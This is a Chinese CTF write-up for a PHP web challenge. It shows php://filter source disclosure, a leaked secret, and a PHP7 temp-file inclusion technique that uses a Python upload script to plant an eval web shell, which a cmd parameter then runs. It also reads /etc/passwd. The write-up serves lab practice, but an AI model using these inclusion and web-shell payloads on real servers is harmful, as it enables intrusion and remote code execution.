![](<./img/Pasted image 20230121101659.png>)

```
/index.php
```

```
username/password error
```

![](<./img/Pasted image 20230121101833.png>)

![](<./img/Pasted image 20230121102812.png>)

```
/index.php?pass=fa25e54758d5d5c1927781a6ede89f8a
```

![](<./img/Pasted image 20230121103010.png>)

![](<./img/Pasted image 20230121103329.png>)

```
/flflflflag.php
```

```html
<html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
</head>
<>
<body>
include($_GET["file"])</body>
</html>
```

```
/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=flflflflag.php
```

```php
<html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
</head>
<>
<body>
<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
	die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
</body>
</html>
```

`flag`并不在这里

```
/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=index.php
```

```php
<?php
include 'config.php';
@$name=$_GET['name'];
@$pass=$_GET['pass'];
if(md5($secret.$name)===$pass){
	echo '<script language="javascript" type="text/javascript">
           window.location.href="flflflflag.php";
	</script>
';
}else{
	setcookie("Hash",md5($secret.$name),time()+3600000);
	echo "username/password error";
}
?>
<html>
<!--md5($secret.$name)===$pass -->
</html>
```

```
/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=config.php
```

```php
<?php
$secret='%^$&$#fffdflag_is_not_here_ha_ha';
?>
```

死胡同.jpg

---

# php临时文件包含

![](<./img/Pasted image 20230121111807.png>)

扫目录能扫到`dir.php`

```
/flflflflag.php?file=php://filter/read=convert.base64-encode/resource=dir.php
```

```php
<?php
var_dump(scandir('/tmp'));
?>
```

通过`dir.php`可以查看`/tmp`目录下的文件

![](<./img/Pasted image 20230121113234.png>)

`php`在接收`POST`上传的文件之后会把文件先放在临时目录下面，之后再通过`move_uploaded_file`之类的操作移动到别的地方

利用`php7`部分版本的一个`bug`可以让`php`崩溃，于是上传的文件滞留在临时目录而不会被自动删除

```
/flflflflag.php?file=php://filter/read=string.strip_tags/resource=/etc/passwd
```

```python
import requests

url = 'http://b1eb74ce-6032-4d09-a41d-7de34a780ed4.node4.buuoj.cn:81/flflflflag.php?file=php://filter/read=string.strip_tags/resource=/etc/passwd'
payload = "<?php eval($_GET['cmd']); ?>"
files = {'shell.php': payload.encode()}

requests.post(url, files=files)
```

```
/dir.php
```

```php
array(3) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(9) "phpjyG5mT"
}
```

```
/flflflflag.php?file=/tmp/phpjyG5mT&cmd=phpinfo();
```

![](<./img/Pasted image 20230121115152.png>)

#Web #PHP #目录扫描 #源码泄漏 #伪协议 #Vulnerabilities #文件上传